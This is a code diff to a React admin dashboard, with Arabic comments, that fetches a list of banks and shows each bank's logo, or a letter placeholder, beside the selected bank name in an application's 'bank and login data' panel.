@@ -5,6 +5,7 @@ import {
   useGetApplicationStats,
   useListApplications,
   useListSessions,
+  useListBanks,
   getGetApplicationStatsQueryKey,
   getListApplicationsQueryKey,
   getListSessionsQueryKey,
@@ -170,9 +171,13 @@ export default function AdminDashboardPage() {
   const { data: sessions } = useListSessions({
     query: { refetchInterval: 5000 },
   });
+  const { data: banks } = useListBanks();
 
   // خريطة سريعة: sessionId → بيانات الجلسة
   const sessionMap = new Map((sessions ?? []).map((s) => [s.id, s]));
+
+  // خريطة سريعة: bankId → بيانات البنك
+  const bankMap = new Map((banks ?? []).map((b) => [b.id, b]));
 
   // تعريف الحضور: آخر ظهور خلال 90 ثانية
   const isOnline = (session: { lastSeenAt: string }) =>
@@ -838,10 +843,19 @@ export default function AdminDashboardPage() {
                             <CreditCard className="w-4 h-4" />
                             بيانات البنك والدخول
                           </h4>
-                          {/* اسم البنك بارز في الأعلى */}
+                          {/* اسم البنك بارز في الأعلى مع الشعار */}
                           {allData.bankName && (
                             <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 flex items-center gap-3 mb-3">
-                              <CreditCard className="w-5 h-5 text-primary shrink-0" />
+                              {(() => {
+                                const bank = bankMap.get(app.bankId ?? 0);
+                                return bank?.logoUrl ? (
+                                  <img src={bank.logoUrl} alt={bank.nameAr} className="w-14 h-10 object-contain" />
+                                ) : (
+                                  <div className="w-10 h-10 bg-primary/20 rounded-lg flex items-center justify-center text-primary font-black text-lg shrink-0">
+                                    {String(allData.bankName).charAt(0)}
+                                  </div>
+                                );
+                              })()}
                               <div>
                                 <p className="text-[10px] text-muted-foreground font-medium">البنك المختار</p>
                                 <p className="text-base font-black text-primary">{String(allData.bankName)}</p>
